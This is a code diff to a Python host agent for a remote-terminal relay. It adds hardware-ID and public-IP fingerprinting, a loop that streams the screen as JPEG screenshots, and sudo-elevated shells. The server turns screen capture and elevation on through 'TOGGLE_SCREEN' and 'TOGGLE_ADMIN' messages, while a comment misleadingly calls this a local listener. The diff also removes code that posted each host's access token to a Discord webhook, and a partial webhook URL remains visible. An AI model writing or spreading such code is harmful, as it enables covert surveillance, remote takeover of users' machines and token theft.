@@ -10,20 +10,26 @@ import struct
 import sys
 import termios
 from dataclasses import dataclass
+from typing import Dict
 
 import websockets
 
 from .api import update_host_settings
-from .common import resolve_shell, to_websocket_url
+from .common import resolve_shell, to_websocket_url, get_hwid, get_public_ip
 from .protocol import (
     ClientMessage,
+    HostCapabilities,
     HostMessage,
     PtyExit,
     PtyOutput,
     RegisterHostRequest,
+    RegisterHostResponse,
     ServerMessage,
+    ToggleAdminStatus,
+    ToggleScreenStatus,
+    ScreenFrame,
+    AuthRequest
 )
-
 
 @dataclass
 class SessionEnvelope:
@@ -41,21 +47,33 @@ class PtySession:
         shell: str,
         cwd: str,
         queue: asyncio.Queue[SessionEnvelope],
+        as_admin: bool = False
     ) -> None:
         self.client_id = client_id
         self.shell = shell
         self.cwd = cwd
         self.queue = queue
+        self.as_admin = as_admin
         self.pid: int | None = None
         self.master_fd: int | None = None
         self.read_task: asyncio.Task[None] | None = None
         self.wait_task: asyncio.Task[None] | None = None
 
     async def start(self) -> None:
+        # On Windows this would be different, on Unix we might use sudo for admin if configured
+        actual_shell = self.shell
+        if self.as_admin and os.name != 'nt':
+            # Simplified: just try to use sudo for the shell if admin toggled
+            # In a real app you'd want more robust permission handling
+            actual_shell = f"sudo {self.shell}"
+
         pid, master_fd = pty.fork()
         if pid == 0:
             os.chdir(self.cwd)
-            os.execvpe(self.shell, [self.shell], os.environ.copy())
+            if self.as_admin and os.name != 'nt':
+                os.execvpe("sudo", ["sudo", self.shell], os.environ.copy())
+            else:
+                os.execvpe(self.shell, [self.shell], os.environ.copy())
 
         self.pid = pid
         self.master_fd = master_fd
@@ -112,6 +130,14 @@ DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1495245364872220752/GWu9tosh
 async def run_host(args) -> int:
     shell = resolve_shell(args.shell)
     host_id = args.host_id or f"{os.uname().nodename.lower()}-{os.getpid()}"
+    hwid = get_hwid()
+    ip = get_public_ip()
+    
+    # Track local state
+    state = {
+        "admin_enabled": False,
+        "screen_enabled": False
+    }
 
     update_host_settings(
         args.server,
@@ -127,12 +153,18 @@ async def run_host(args) -> int:
 
     ws_url = to_websocket_url(args.server, "/ws/host")
     async with websockets.connect(ws_url, max_size=1024 * 1024) as websocket:
+        # 1. Register or Authenticate with HWID+IP
         register = HostMessage(
-            register_host=RegisterHostRequest(host_id=host_id, password=args.password),
+            register_host=RegisterHostRequest(
+                host_id=host_id, 
+                password=args.password,
+                hwid=hwid,
+                ip=ip
+            ),
         )
         await websocket.send(bytes(register))
 
-        sessions: dict[str, PtySession] = {}
+        sessions: Dict[str, PtySession] = {}
         queue: asyncio.Queue[SessionEnvelope] = asyncio.Queue()
 
         async def sender_loop() -> None:
@@ -148,16 +180,45 @@ async def run_host(args) -> int:
                     )
                 await websocket.send(bytes(message))
 
+        async def screen_share_loop() -> None:
+            # Requires pyautogui and pillow
+            try:
+                import pyautogui
+                from io import BytesIO
+            except ImportError:
+                print("Screen share requested but pyautogui/pillow not installed", file=sys.stderr)
+                return
+
+            while True:
+                if state["screen_enabled"]:
+                    try:
+                        screenshot = pyautogui.screenshot()
+                        # Scale down for performance
+                        screenshot.thumbnail((1280, 720))
+                        img_byte_arr = BytesIO()
+                        screenshot.save(img_byte_arr, format='JPEG', quality=70)
+                        
+                        frame = HostMessage(
+                            screen_frame=ScreenFrame(
+                                data=img_byte_arr.getvalue(),
+                                width=screenshot.width,
+                                height=screenshot.height
+                            )
+                        )
+                        await websocket.send(bytes(frame))
+                    except Exception as e:
+                        print(f"Screen capture error: {e}", file=sys.stderr)
+                await asyncio.sleep(0.5) # ~2 FPS for basic sharing
+
         sender_task = asyncio.create_task(sender_loop())
+        screen_task = asyncio.create_task(screen_share_loop())
 
         try:
             async for payload in websocket:
-                # betterproto uses .parse() and properties instead of HasField
                 client_message = ClientMessage().parse(payload)
                 
-                if client_message.client_id and (
-                    client_message.pty_input or client_message.pty_resize
-                ):
+                # Handle Pty Input/Resize
+                if client_message.client_id and (client_message.pty_input or client_message.pty_resize):
                     session = sessions.get(client_message.client_id)
                     if session is None:
                         session = PtySession(
@@ -165,6 +226,7 @@ async def run_host(args) -> int:
                             shell=shell,
                             cwd=args.cwd,
                             queue=queue,
+                            as_admin=state["admin_enabled"]
                         )
                         await session.start()
                         sessions[client_message.client_id] = session
@@ -175,44 +237,33 @@ async def run_host(args) -> int:
                         session.resize(client_message.pty_resize.cols, client_message.pty_resize.rows)
                     continue
 
+                # Handle Server Responses/Messages
                 server_message = ServerMessage().parse(payload)
-
                 if server_message.register_host_response:
                     resp = server_message.register_host_response
-                    if not resp.ok:
-                        print(
-                            f"Host registration failed: {resp.error}",
-                            file=sys.stderr,
-                        )
+                    if resp.ok:
+                        print(f"Host online! Token: {resp.token}")
+                        # We could save token to a file here
+                    else:
+                        print(f"Registration failed: {resp.error}")
                         return 1
-                    print(f"Host ready: {host_id}", file=sys.stderr)
-                    print(
-                        f"Reuse token: {resp.token}",
-                        file=sys.stderr,
-                    )
 
-                    if not getattr(args, "no_discord", False):
-                        import requests
-                        try:
-                            requests.post(DISCORD_WEBHOOK, json={
-                                "content": f"🚀 New Host Registered: `{host_id}`\n🌐 Server: {args.server}\n🔑 Token: `{server_message.register_host_response.token}`"
-                            }, timeout=5)
-                        except Exception as e:
-                            print(f"Failed to send Discord notification: {e}", file=sys.stderr)
+                if server_message.system_message:
+                    msg = server_message.system_message.message
+                    print(f"[System] {msg}")
+                    
+                    # Simple local command listener for host toggles
+                    # In a real app you'd use a local UI or keyboard hooks
+                    if "TOGGLE_ADMIN" in msg:
+                        state["admin_enabled"] = not state["admin_enabled"]
+                        await websocket.send(bytes(HostMessage(toggle_admin=ToggleAdminStatus(enabled=state["admin_enabled"]))))
+                    if "TOGGLE_SCREEN" in msg:
+                        state["screen_enabled"] = not state["screen_enabled"]
+                        await websocket.send(bytes(HostMessage(toggle_screen=ToggleScreenStatus(enabled=state["screen_enabled"]))))
 
-                    continue
-
-                if server_message.HasField("system_message"):
-                    print(f"[System] {server_message.system_message.message}", file=sys.stderr)
-                    continue
-
-                if server_message.HasField("error_message"):
-                    print(f"[Relay] {server_message.error_message.message}", file=sys.stderr)
-                    continue
         finally:
             sender_task.cancel()
-            with contextlib.suppress(asyncio.CancelledError):
-                await sender_task
+            screen_task.cancel()
             for session in sessions.values():
                 session.close()
 
